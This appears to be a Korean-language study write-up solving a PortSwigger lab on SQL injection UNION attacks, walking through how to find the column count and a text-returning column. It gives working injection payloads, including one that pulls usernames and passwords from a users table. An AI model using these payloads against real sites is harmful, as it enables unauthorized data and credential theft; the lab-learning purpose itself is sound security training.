# Lab: SQL injection UNION attack, finding a column containing text

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — UNION Attack / 문자열 출력 컬럼 탐색
- **링크**: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

## 목표

UNION 공격으로 랩이 제시하는 특정 문자열을 응답에 출력한다.

## 007 랩과의 관계

007이 컬럼 수를 파악하는 것이 목표였다면, 008은 그 다음 단계인 **어느 컬럼이 문자열을 출력할 수 있는지** 찾는 것이다. UNION 공격의 최종 목표는 원하는 데이터를 화면에 출력하는 것이므로, 문자열 타입 컬럼의 위치를 알아야 한다.

```
007: 컬럼 수 파악          → UNION SELECT NULL,NULL,NULL 성공
008: 문자열 컬럼 위치 파악  → UNION SELECT 'a',NULL,NULL / NULL,'a',NULL / ...
```

## 풀이

### 1단계 — 컬럼 수 파악 (ORDER BY)

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--   ← 에러 발생
```

컬럼 수는 **3개**로 확인.

### 2단계 — 컬럼 수 검증 (UNION SELECT NULL)

```sql
' UNION SELECT NULL,NULL,NULL--
```

정상 응답 확인.

### 3단계 — 문자열 출력 가능한 컬럼 탐색

NULL을 하나씩 `'a'`로 교체하며 어느 컬럼이 문자열을 받는지 확인한다.

```sql
' UNION SELECT 'a',NULL,NULL--   ← 에러 (1번 컬럼은 문자열 불가)
' UNION SELECT NULL,'a',NULL--   ← 정상 응답, 화면에 'a' 출력 (2번 컬럼 문자열 가능)
```

2번 컬럼이 문자열 출력 가능한 위치임을 확인.

### 4단계 — 지정 문자열 출력

랩에서 제시한 문자열(예: `'7Hf3Kp'`)을 2번 컬럼에 삽입한다.

```sql
' UNION SELECT NULL,'7Hf3Kp',NULL--
```

응답 화면에 해당 문자열이 출력되면 랩 완료.

## 핵심 정리

- 컬럼 수 파악 이후 반드시 **문자열 출력 가능한 컬럼 위치**를 찾아야 실질적인 데이터 추출이 가능하다.
- `'a'`를 하나씩 이동하며 에러/정상 응답 차이로 위치를 좁힌다.
- 숫자 타입 컬럼에 문자열을 넣으면 타입 불일치 에러가 발생하므로 NULL을 유지해야 한다.

## 배운 점 및 추가 학습

### 1. UNION 공격 전체 준비 단계 흐름

003 랩부터 이어온 UNION 공격의 준비 단계가 008로 완성된다.

```
① 컬럼 수 파악    ORDER BY N → 에러 직전 숫자
② 컬럼 수 확정    UNION SELECT NULL,...,NULL → 정상 응답
③ 문자열 컬럼 탐색 UNION SELECT 'a',NULL,... → 위치별 에러/정상 확인
④ 데이터 추출     UNION SELECT NULL,실제데이터,NULL
```

이 4단계가 UNION 기반 SQL injection의 표준 준비 절차다.

### 2. 컬럼 타입 불일치 에러

각 컬럼에는 원본 쿼리에서 정의된 데이터 타입이 있다. UNION으로 결합할 때 타입이 맞지 않으면 에러가 발생한다.

| 원본 컬럼 타입 | 삽입 값 | 결과 |
|---------------|---------|------|
| 문자열 | `'a'` | 정상 |
| 문자열 | `NULL` | 정상 (NULL은 타입 무관) |
| 정수 | `'a'` | 에러 |
| 정수 | `NULL` | 정상 (NULL은 타입 무관) |

NULL이 타입 무관하게 동작하는 덕분에 컬럼 수 검증과 타입 탐색을 분리해서 진행할 수 있다.

### 3. 문자열 컬럼이 여러 개일 때

컬럼이 여러 개이고 문자열 컬럼도 여러 개라면, 추출하려는 데이터의 길이에 따라 유리한 위치를 선택하거나 여러 컬럼을 동시에 활용할 수 있다.

```sql
-- 두 컬럼 모두 문자열인 경우 username, password를 각각 다른 컬럼에 출력
' UNION SELECT NULL,username,password FROM users--
```

### 4. 추가로 고민해볼 것

- 컬럼 수가 많을 때 `'a'`를 일일이 이동하는 대신 Burp Suite Intruder로 자동화할 수 있다.
- 문자열 컬럼이 화면에 표시되지 않더라도(Blind), 에러 유무만으로 타입을 판별할 수 있다.
- 여기까지의 준비 단계를 마치면 005·006 랩처럼 `information_schema`나 실제 테이블에서 원하는 데이터를 자유롭게 추출할 수 있다.
